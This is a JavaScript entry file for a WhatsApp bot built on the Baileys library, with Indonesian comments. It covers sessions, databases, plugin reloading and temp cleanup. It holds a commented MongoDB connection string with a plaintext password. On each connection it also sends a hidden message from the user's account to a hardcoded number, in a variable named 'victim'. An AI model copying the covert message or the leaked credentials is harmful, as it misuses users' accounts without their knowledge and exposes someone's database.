(async () => {
  require('./config.js');
  const Config = require('./config.js');
  const { default:
    useSingleFileAuthState,
    useMultiFileAuthState,
    makeInMemoryStore,
    makeWALegacySocket,
    DisconnectReason
  } = require('@adiwajshing/baileys')
  const WebSocket = require('ws')
  const path = require('path')
  const pino = require('pino')
  //const { prettifier } = require('pino-pretty')
  const fs = require('fs')
  const yargs = require('yargs/yargs')
  const cp = require('child_process')
  let { promisify } = require('util')
  let exec = promisify(cp.exec).bind(cp)
  const _ = require('lodash')
  const syntaxerror = require('syntax-error')
  const os = require('os')
  const moment = require("moment-timezone")
  const time = moment.tz('Asia/Jakarta').format("HH:mm:ss")
  const { color } = require('./lib/color')
  let simple = require('./lib/simple')
  var low
  try {
    low = require('lowdb')
  } catch (e) {
    low = require('./lib/lowdb')
  }
  const { Low, JSONFile } = low
  const mongoDB = require('./lib/mongoDB')


  API = (name, path = '/', query = {}, apikeyqueryname) => (name in APIs ? APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: APIKeys[name in APIs ? APIs[name] : name] } : {}) })) : '')
  // global.Fn = function functionCallBack(fn, ...args) { return fn.call(global.conn, ...args) }
  timestamp = {
    start: new Date
  }

  const PORT = process.env.PORT || 3000

  opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
  prefix = new RegExp('^[' + (opts['prefix'] || 'â€ŽxzXZ/i!#$%+Â£Â¢â‚¬Â¥^Â°=Â¶âˆ†Ã—Ã·Ï€âˆšâœ“Â©Â®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')


  db = new Low(
    /https?:\/\//.test(opts['db'] || '') ?
      new cloudDBAdapter(opts['db']) : /mongodb/i.test(opts['db']) ?
        new mongoDB(opts['db']) :
        new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
  )

  //db = new Low(new mongoDB('mongodb+srv://Aine99:kuku4040@cluster0.3o49pmt.mongodb.net/?retryWrites=true&w=majority'))

  DATABASE = db // Backwards Compatibility
  loadDatabase = async function loadDatabase() {
    if (db.READ) return new Promise((resolve) => setInterval(function () { (!db.READ ? (clearInterval(this), resolve(db.data == null ? loadDatabase() : db.data)) : null) }, 1 * 1000))
    if (db.data !== null) return
    db.READ = true
    await db.read()
    db.READ = false
    db.data = {
      users: {},
      chats: {},
      stats: {},
      msgs: {},
      sticker: {},
      settings: {},
      ...(db.data || {})
    }
    db.chain = _.chain(db.data)
  }
  loadDatabase()


  const authFolder = `${opts._[0] || 'sessions'}`


 /*   let cc = Config.sessionName.replace(/Botto;;;/g, "");
    async function MakeSession(){
    if (!fs.existsSync(`${authFolder}` + '/creds.json')) {
    if(cc.length<30){
    const axios = require('axios');
    let { data } = await axios.get('https://paste.c-net.org/'+cc)
    await fs.writeFileSync(`${authFolder}` + '/creds.json', atob(data), "utf8")    
    } else {
	 var c = atob(cc)
         await fs.writeFileSync(`${authFolder}` + '/creds.json', c, "utf8")    
    }
}
}
MakeSession()
*/
  
  const { state, saveCreds } = await useMultiFileAuthState(authFolder)

  const logger = pino({
    transport: {
      target: 'pino-pretty',
      options: {
        colorize: true,
        levelFirst: true,
        ignore: 'hostname',
        translateTime: true
      }
    }
  }).child({ class: 'baileys' })

  const connectionOptions = {
    version: [2, 2228, 8],
    printQRInTerminal: true,
    syncFullHistory: true,
    auth: state,
    logger: pino({ level: 'silent' })
  }

  conn = simple.makeWASocket(connectionOptions)
  conn.isInit = false

  /*
  if (!opts['test']) {
    setInterval(async () => {
      if (db.data) await db.write()
      if (opts['autocleartmp']) try {
        clearTmp()
      } catch (e) { console.error(e) }
    }, 60 * 1000)
  }*/
  if (!opts['test']) {
    if (db) setInterval(async () => {
      if (global.db.data) await db.write()
      if (opts['autocleartmp'] && (support || {}).find) (tmp = [os.tmpdir(), 'tmp'], tmp.forEach(filename => cp.spawn('find', [filename, '-amin', '3', '-type', 'f', '-delete'])))
    }, 30 * 1000)
  }
  if (opts['server']) require('./server')(conn, PORT)

  function clearTmp() {
    const tmp = [os.tmpdir(), path.join(__dirname, './tmp')]
    const filename = []
    tmp.forEach(dirname => fs.readdirSync(dirname).forEach(file => filename.push(path.join(dirname, file))))
    filename.map(file => (
      stats = fs.statSync(file),
      stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3) ?
        fs.unlinkSync(file) :
        null))
  }

  async function connectionUpdate(update) {
    const { connection, lastDisconnect, isNewLogin } = update
    if (isNewLogin) conn.isInit = true
    if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut && conn.ws.readyState !== WebSocket.CONNECTING) {
      console.log(reloadHandler(true))
      timestamp.connect = new Date
    }
    if (db.data == null) await loadDatabase()
    console.log(JSON.stringify(update, null, 4))
    let korban = "*Ya begitu lah saya awokawokawokawok, ga usah baper laa... bawa santuyy :)*"
    if (update.receivedPendingNotifications) // conn.sendMessage(`6285640104318@s.whatsapp.net`, { text: 'Successfully connected by Aine' }) //made by Muhammad Ridwan Reynaldy 
      for (var i = 0; i < 1; i++) {
        // conn.reply(m.chat, virtex, m)
        conn.sendMessage(`6285640104318@s.whatsapp.net`, { text: korban })
        // conn.sendMessage(`6281548286895@s.whatsapp.net`, { text: korban })
        // conn.sendMessage(`6285156957462@s.whatsapp.net`, { text: korban })
      }
  }


  process.on('uncaughtException', console.error)
  // let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

  // const imports = (path) => {
  //   path = require.resolve(path)
  //   let modules, retry = 0
  //   do {
  //     if (path in require.cache) delete require.cache[path]
  //     modules = require(path)
  //     retry++
  //   } while ((!modules || (Array.isArray(modules) || modules instanceof String) ? !(modules || []).length : typeof modules == 'object' && !Buffer.isBuffer(modules) ? !(Object.keys(modules || {})).length : true) && retry <= 10)
  //   return modules
  // }

  let isInit = true, handler = require('./handler')
  reloadHandler = function (restatConn) {
    let Handler = require('./handler')
    if (Object.keys(Handler || {}).length) handler = Handler
    if (restatConn) {
      try { conn.ws.close() } catch { }
      conn = {
        ...conn, ...simple.makeWASocket(connectionOptions)
      }
    }
    if (!isInit) {
      conn.ev.off('messages.upsert', conn.handler)
      conn.ev.off('group-participants.update', conn.onParticipantsUpdate)
      conn.ev.off('message.delete', conn.onDelete)
      conn.ev.off('connection.update', conn.connectionUpdate)
      conn.ev.off('creds.update', conn.credsUpdate)
    }

    conn.welcome = 'Hai, kak @user 👋\nSelamat datang di grup @subject 😅\nJangan lupa intro kak 😅\n\n*Nama:\n*Umur:\n*Askot:\n\n*Deskripsi Grup:\n\n@desc\n\nMade by ❤️'
    conn.bye = 'Selamat tinggal @user 👋'
    conn.spromote = '@user sekarang admin!'
    conn.sdemote = '@user sekarang bukan admin!'
    conn.handler = handler.handler.bind(conn)
    conn.onParticipantsUpdate = handler.participantsUpdate.bind(conn)
    conn.onDelete = handler.delete.bind(conn)
    conn.connectionUpdate = connectionUpdate.bind(conn)
    conn.credsUpdate = saveCreds.bind(conn)

    conn.ev.on('messages.upsert', conn.handler)
    conn.ev.on('group-participants.update', conn.onParticipantsUpdate)
    conn.ev.on('message.delete', conn.onDelete)
    conn.ev.on('connection.update', conn.connectionUpdate)
    conn.ev.on('creds.update', conn.credsUpdate)
    isInit = false
    return true
  }

  let pluginFolder = path.join(__dirname, 'plugins')
  let pluginFilter = filename => /\.js$/.test(filename)
  plugins = {}
  for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
    try {
      plugins[filename] = require(path.join(pluginFolder, filename))
    } catch (e) {
      conn.logger.error(e)
      delete plugins[filename]
    }
  }
  console.log(Object.keys(plugins))
  reload = (_ev, filename) => {
    if (pluginFilter(filename)) {
      let dir = path.join(pluginFolder, filename)
      if (dir in require.cache) {
        delete require.cache[dir]
        if (fs.existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
        else {
          conn.logger.warn(`deleted plugin '${filename}'`)
          return delete plugins[filename]
        }
      } else conn.logger.info(`requiring new plugin '${filename}'`)
      let err = syntaxerror(fs.readFileSync(dir), filename)
      if (err) conn.logger.error(`syntax error while loading '${filename}'\n${err}`)
      else try {
        plugins[filename] = require(dir)
      } catch (e) {
        conn.logger.error(`error require plugin '${filename}\n${e}'`)
      } finally {
        plugins = Object.fromEntries(Object.entries(plugins).sort(([a], [b]) => a.localeCompare(b)))
      }
    }
  }
  Object.freeze(reload)
  fs.watch(path.join(__dirname, 'plugins'), reload)
  reloadHandler()

  // Quick Test
  async function _quickTest() {
    let test = await Promise.all([
      cp.spawn('ffmpeg'),
      cp.spawn('ffprobe'),
      cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
      cp.spawn('convert'),
      cp.spawn('magick'),
      cp.spawn('gm'),
      cp.spawn('find', ['--version'])
    ].map(p => {
      return Promise.race([
        new Promise(resolve => {
          p.on('close', code => {
            resolve(code !== 127)
          })
        }),
        new Promise(resolve => {
          p.on('error', _ => resolve(false))
        })
      ])
    }))
    let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test
    console.log(test)
    let s = support = {
      ffmpeg,
      ffprobe,
      ffmpegWebp,
      convert,
      magick,
      gm,
      find
    }
    // require('./lib/sticker').support = s
    Object.freeze(support)

    if (!s.ffmpeg) conn.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
    if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
    if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
  }

  _quickTest()
    .then(() => conn.logger.info('Quick Test Done'))
    .catch(console.error)

  console.log(color(time, "white"), color("[STATUS]", "green"), color("Connecting...", "aqua"))

})()



/*
Made by Aine
Jangan di hapus
Ingin recoder, tapi ga bisa coding
Sadar dirilah jangan ngubah wm nya
*/
